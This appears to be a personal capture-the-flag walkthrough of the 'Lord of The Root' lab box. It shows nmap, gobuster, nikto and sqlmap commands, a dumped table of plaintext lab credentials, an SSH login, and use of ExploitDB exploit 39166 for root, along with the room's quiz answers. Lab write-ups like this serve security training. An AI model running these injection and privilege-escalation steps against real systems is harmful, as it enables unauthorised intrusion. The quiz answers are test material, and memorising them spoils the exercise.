# Lord of The Root
(IP address changes because I had to restart the box multiple times through out the day)
____

# My IP = 10.8.19.163

# Export IP = 10.10.209.228
____

# NMAP 

> nmap -f -Pn -n -vv -T4 -A 10.10.209.228 | tee lord-root.nmap

> cat lord-root.nmap | grep 'open'

Results:

> 22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
> 1337/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
---	

1. What open ports do you see?

> 22 & 1337

2. What method is used to reveal hidden ports?

> port knocking (Didn't use this method had to do alot of google surfing to find this answer.)

3. What port is the hidden service on?

> 1337 Discovered by using a "-f" on the nmap scan. 

# Gobuster

> gobuster dir -u http://10.10.123.133:1337 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee bustrd.txt

Results:

	/images (Status: 301)
	/server-status (Status: 403)

# Custom Error 404 page

> "View Page Source"

> Tried to find a upload path to get a reverse shell into the system. I discovered in a "upload". There was a base64 encoded message. Decoded the message to contain "Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!" Checking to see if its a hash. Could be ssh key.

> Redid a base64 decode. Results:

> /978345210/index --> NEW DIRECTORY!

URL directory:

> http://10.10.123.133:1337/978345210/index.php

# Nikto

> nikto -h 10.10.123.133:1337 | tee nikto-lord.txt

Results:

#SQLMAP

> sqlmap -o -u "http://10.10.123.133:1337/978345210/index.php" --data="username=admin&password=pass&submit=+Login+" --method=POST --level=3 -D MySql - T Users

Results:

| id   | username | password         |
+------+----------+------------------+
| 1    | frodo    | iwilltakethering |
| 2    | smeagol  | MyPreciousR00t   | --- Use to obtain a ssh shell/
| 3    | aragorn  | AndMySword       |
| 4    | legolas  | AndMyBow         |
| 5    | gimli    | AndMyAxe         |

# SSH

> ssh smeagol@10.10.23.193 password: MyPreciousR00t

# ExploitDB

> Copied script for exploit# 39166 into a ".c" file and compiled it in the target and ran it for root.

4. Whats the method to exploit the system for privilege escalation called?

> buffer overflow

5. Who wrote the message in the flag message in the roots home directory?

> Gandalf


